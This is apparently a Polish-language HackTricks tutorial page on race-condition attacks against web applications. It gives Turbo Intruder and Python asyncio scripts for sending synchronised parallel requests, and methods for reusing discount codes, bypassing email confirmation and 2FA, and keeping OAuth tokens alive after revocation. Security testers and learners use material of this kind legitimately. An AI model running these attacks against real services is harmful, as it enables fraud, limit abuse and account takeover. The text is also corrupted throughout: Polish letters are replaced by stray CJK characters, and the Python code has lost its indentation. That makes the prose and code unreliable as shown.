# Warunek wycigu

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa przepywy pracy** zasilane przez najbardziej zaawansowane narzdzia spoecznociowe na wiecie.\
Zdobd藕 dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Zacznij od zera i zosta mistrzem hakowania AWS z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

{% hint style="warning" %}
Aby uzyska gbsze zrozumienie tej techniki, sprawd藕 oryginalny raport na stronie [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Wzmacnianie atak贸w warunku wycigu

G贸wn przeszkod w wykorzystaniu warunk贸w wycigu jest upewnienie si, 偶e kilka 偶da jest obsugiwanych jednoczenie, z **bardzo niewielk r贸偶nic w czasach ich przetwarzaniaidealnie poni偶ej 1 ms**.

Oto kilka technik synchronizacji 偶da:

#### Atak pojedynczym pakietem HTTP/2 kontra synchronizacja ostatniego bajtu HTTP/1.1

* **HTTP/2**: Obsuguje wysyanie dw贸ch 偶da przez jedno poczenie TCP, zmniejszajc wpyw zak贸ce sieci. Jednak偶e, ze wzgldu na zmiennoci po stronie serwera, dwa 偶dania mog nie wystarczy do sp贸jnego wykorzystania warunku wycigu.
* **HTTP/1.1 'Synchronizacja ostatniego bajtu'**: Umo偶liwia wczeniejsze wysanie wikszoci czci 20-30 偶da, z zatrzymaniem maego fragmentu, kt贸ry jest nastpnie wysyany razem, osigajc jednoczesne dotarcie do serwera.

**Przygotowanie do synchronizacji ostatniego bajtu** obejmuje:

1. Wysanie nag贸wk贸w i danych ciaa bez ostatniego bajtu bez zakoczenia strumienia.
2. Poczekanie 100 ms po pocztkowym wysaniu.
3. Wyczenie TCP\_NODELAY, aby wykorzysta algorytm Nagle'a do partycjonowania kocowych ramek.
4. Pingowanie w celu rozgrzania poczenia.

Nastpne wysanie zatrzymanych ramek powinno skutkowa ich przybyciem w jednym pakiecie, co mo偶na zweryfikowa za pomoc Wiresharka. Ta metoda nie dotyczy plik贸w statycznych, kt贸re zazwyczaj nie s zaanga偶owane w ataki RC.

### Dostosowanie do architektury serwera

Zrozumienie architektury celu jest kluczowe. Serwery front-end mog kierowa 偶dania w inny spos贸b, wpywajc na czasowanie. Wstpne rozgrzewanie poczenia po stronie serwera, poprzez nieistotne 偶dania, mo偶e znormalizowa czasowanie 偶dania.

#### Obsuga blokady opartej na sesji

Frameworki takie jak obsuga sesji w PHP serializuj 偶dania wedug sesji, co potencjalnie mo偶e zaciemni podatnoci. Wykorzystanie r贸偶nych token贸w sesji dla ka偶dego 偶dania mo偶e obej ten problem.

#### Przezwyci偶anie limit贸w szybkoci lub zasob贸w

Jeli rozgrzewanie poczenia jest nieskuteczne, celowe wywoanie op贸藕nie limit贸w szybkoci lub zasob贸w serwer贸w WWW poprzez zalewanie faszywymi 偶daniami mo偶e uatwi atak pojedynczym pakietem, wywoujc op贸藕nienie po stronie serwera sprzyjajce warunkom wycigu.

## Przykady atak贸w

* **Tubo Intruder - atak pojedynczym pakietem HTTP2 (1 punkt kocowy)**: Mo偶esz wysa 偶danie do **Turbo Intruder** (`Rozszerzenia` -> `Turbo Intruder` -> `Wylij do Turbo Intruder`), mo偶esz zmieni w 偶daniu warto, kt贸r chcesz brutalnie siowa dla **`%s`** jak w `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`, a nastpnie wybra **`examples/race-single-packer-attack.py`** z listy rozwijanej:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Jeli zamierzasz **wysa r贸偶ne wartoci**, mo偶esz zmodyfikowa kod, kt贸ry korzysta z listy s贸w z schowka:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Jeli witryna nie obsuguje HTTP2 (tylko HTTP1.1), u偶yj `Engine.THREADED` lub `Engine.BURP` zamiast `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - atak jednopakietowy HTTP2 (Wiele punkt贸w kocowych)**: W przypadku koniecznoci wysania 偶dania do jednego punktu kocowego, a nastpnie wielu do innych punkt贸w kocowych w celu wywoania RCE, mo偶na zmodyfikowa skrypt `race-single-packet-attack.py` w nastpujcy spos贸b:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Jest r贸wnie偶 dostpny w **Repeater** za porednictwem nowej opcji '**Wysyaj grup r贸wnolegle**' w Burp Suite.
* Dla **limit-overrun** mo偶na po prostu doda **t sam prob 50 razy** w grupie.
* Dla **rozgrzewania poczenia**, mo偶na **doda** na **pocztku** grupy kilka **偶da** do nieustalonej czci serwera internetowego.
* Aby **op贸藕ni** proces **midzy** przetwarzaniem **jednego 偶dania i drugiego** w 2 krokach podstanu, mo偶na **doda dodatkowe 偶dania midzy** oba 偶dania.
* Dla **wielopunktowego** RC mo偶na zacz wysya **偶danie**, kt贸re **przechodzi do ukrytego stanu**, a nastpnie **50 偶da** zaraz po nim, kt贸re **wykorzystuj ukryty stan**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Surowy BF

Przed poprzednimi badaniami u偶ywano tych adunk贸w, kt贸re po prostu pr贸boway wysa pakiety tak szybko, jak to mo偶liwe, aby spowodowa RC.

* **Repeater:** Sprawd藕 przykady z poprzedniej sekcji.
* **Intruder**: Wylij **偶danie** do **Intrudera**, ustaw **liczb wtk贸w** na **30** w menu **Opcje** i wybierz jako adunek **Puste adunki** oraz wygeneruj **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologia RC**

### Przekroczenie limitu / TOCTOU

To najbardziej podstawowy rodzaj warunku wycigowego, w kt贸rym **wykrywane s podatnoci** w miejscach, kt贸re **ograniczaj liczb razy, jakie mo偶na wykona akcj**. Na przykad u偶ywanie tego samego kodu rabatowego kilka razy w sklepie internetowym. Bardzo atwy przykad mo偶na znale藕 w [**tym raporcie**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) lub w [**tym bdzie**](https://hackerone.com/reports/759247)**.**

Istnieje wiele wariant贸w tego rodzaju ataku, w tym:

* Wymienianie karty podarunkowej wielokrotnie
* Ocenianie produktu wielokrotnie
* Wypacanie lub przekazywanie got贸wki w wikszej iloci ni偶 saldo konta
* Ponowne wykorzystanie jednego rozwizania CAPTCHA
* Ominicie limitu szybkoci anty-brute-force

### **Ukryte podstany**

Wykorzystywanie zo偶onych warunk贸w wycigowych czsto polega na korzystaniu z kr贸tkich okazji do interakcji z ukrytymi lub **niezamierzonymi podstanami maszyny**. Oto jak do tego podej:

1. **Zidentyfikuj Potencjalne Ukryte Podstany**
* Zacznij od zlokalizowania punkt贸w kocowych, kt贸re modyfikuj lub wsp贸dziaaj z krytycznymi danymi, takimi jak profile u偶ytkownik贸w czy procesy resetowania hasa. Skup si na:
* **Przechowywanie**: Preferuj punkty kocowe, kt贸re manipuluj danymi przechowywanymi po stronie serwera, nad tymi obsugujcymi dane po stronie klienta.
* **Dziaanie**: Szukaj operacji, kt贸re zmieniaj istniejce dane, co bardziej prawdopodobnie stwarza warunki do wykorzystania w por贸wnaniu z tymi dodajcymi nowe dane.
* **Kluczowanie**: Udane ataki zazwyczaj obejmuj operacje oparte na tym samym identyfikatorze, np. nazwie u偶ytkownika lub tokenie resetowania.
2. **Przeprowad藕 Pocztkowe Sondowanie**
* Przetestuj zidentyfikowane punkty kocowe za pomoc atak贸w warunk贸w wycigowych, obserwujc wszelkie odstpstwa od oczekiwanych rezultat贸w. Nieoczekiwane odpowiedzi lub zmiany w zachowaniu aplikacji mog sygnalizowa podatno.
3. **Wyka偶 Podatno**
* Ogranicz atak do minimalnej liczby 偶da potrzebnych do wykorzystania podatnoci, czsto tylko dw贸ch. Ten krok mo偶e wymaga wielokrotnych pr贸b lub automatyzacji ze wzgldu na precyzyjne wymagane czasowanie.

### Ataki Zale偶ne od Czasu

Precyzja w czasowaniu 偶da mo偶e ujawni podatnoci, zwaszcza gdy do generowania token贸w bezpieczestwa u偶ywane s przewidywalne metody, takie jak znaczniki czasu. Na przykad generowanie token贸w resetowania hasa na podstawie znacznik贸w czasu mo偶e pozwoli na identyczne tokeny dla r贸wnoczesnych 偶da.

**Aby Wykorzysta:**

* U偶yj precyzyjnego czasowania, jak w ataku jednopakietowym, aby zo偶y r贸wnoczesne 偶dania resetowania hasa. Identyczne tokeny wskazuj na podatno.

**Przykad:**

* Popro o dwa tokeny resetowania hasa w tym samym czasie i por贸wnaj je. Pasujce tokeny sugeruj bd w generowaniu token贸w.

**Sprawd藕 to** [**Laboratorium PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **aby to wypr贸bowa.**

## Studia przypadk贸w ukrytych podstan贸w

### Zapa i dodaj przedmiot

Sprawd藕 to [**Laboratorium PortSwigger**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation), aby zobaczy, jak **zapaci** w sklepie i **doda dodatkowy** przedmiot, za kt贸ry **nie trzeba paci**.

### Potwierd藕 inne adresy e-mail

Idea polega na **zweryfikowaniu adresu e-mail i jednoczesnej zmianie go na inny**, aby dowiedzie si, czy platforma weryfikuje nowo zmieniony.

### Zmie e-mail na 2 adresy e-mail oparte na plikach cookie

Zgodnie z [**t analiz**](https://portswigger.net/research/smashing-the-state-machine) Gitlab by podatny na przejcie w ten spos贸b, poniewa偶 m贸g **wysa token weryfikacyjny e-maila z jednego adresu e-mail na drugi**.

**Sprawd藕 to** [**Laboratorium PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **aby to wypr贸bowa.**

### Ukryte stany bazy danych / Ominicie potwierdzenia

Jeli **u偶ywane s 2 r贸偶ne zapisy** do **dodania informacji** do **bazy danych**, istnieje kr贸tki okres czasu, w kt贸rym **tylko pierwsze dane zostay zapisane** w bazie danych. Na przykad podczas tworzenia u偶ytkownika **nazwa u偶ytkownika** i **haso** mog by **zapisane**, a nastpnie **token** do potwierdzenia nowo utworzonego konta jest zapisywany. Oznacza to, 偶e przez kr贸tki czas **token do potwierdzenia konta jest pusty**.

Dlatego **zarejestrowanie konta i wysanie kilku 偶da z pustym tokenem** (`token=` lub `token[]=` lub inna wariacja) w celu natychmiastowego potwierdzenia konta mo偶e pozwoli na **potwierdzenie konta**, kt贸rego nie kontrolujesz.

**Sprawd藕 to** [**Laboratorium PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **aby to wypr贸bowa.**

### Ominicie 2FA

Poni偶szy pseudokod jest podatny na warunek wycigowy, poniewa偶 przez bardzo kr贸tki czas **2FA nie jest wymagane**, podczas gdy sesja jest tworzona:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Wieczysta trwao OAuth2

Istnieje kilka [**dostawc贸w OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Te usugi pozwol Ci utworzy aplikacj i uwierzytelni u偶ytkownik贸w zarejestrowanych przez dostawc. Aby to zrobi, **klient** bdzie musia **zezwoli Twojej aplikacji** na dostp do niekt贸rych ich danych wewntrz **dostawcy OAuth**.\
Wic, do tej pory to tylko standardowe logowanie za pomoc google/linkedin/github... gdzie pojawia si strona informujca: "_Aplikacja \<InsertCoolName> chce uzyska dostp do Twoich informacji, czy chcesz jej na to zezwoli?_"

#### Wycig warunk贸w w `authorization_code`

**Problem** pojawia si, gdy **zaakceptujesz** i automatycznie wysyasz **`authorization_code`** do zoliwej aplikacji. Nastpnie ta **aplikacja wykorzystuje Wycig Warunk贸w w dostawcy usugi OAuth, aby wygenerowa wicej ni偶 jedn AT/RT** (_Authentication Token/Refresh Token_) z **`authorization_code`** dla Twojego konta. W skr贸cie, wykorzysta fakt, 偶e zezwolie aplikacji na dostp do swoich danych, aby **utworzy kilka kont**. Wtedy, jeli **zatrzymasz zezwolenie dla aplikacji na dostp do swoich danych, jedna para AT/RT zostanie usunita, ale pozostae bd wci偶 wa偶ne**.

#### Wycig warunk贸w w `Refresh Token`

Gdy ju偶 **uzyskasz wa偶ny RT**, mo偶esz spr贸bowa **wykorzysta go do wygenerowania kilku AT/RT** i **nawet jeli u偶ytkownik anuluje uprawnienia** dla zoliwej aplikacji do dostpu do jego danych, **kilka RT nadal bdzie wa偶nych**.

## **Wycig warunk贸w w WebSockets**

W [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) znajdziesz PoC w Javie do wysyania wiadomoci websocket **r贸wnolegle**, aby wykorzysta **Wycigi Warunk贸w tak偶e w WebSockets**.

## Referencje

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa workflowy** zasilane przez najbardziej zaawansowane narzdzia spoecznociowe na wiecie.\
Zdobd藕 dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
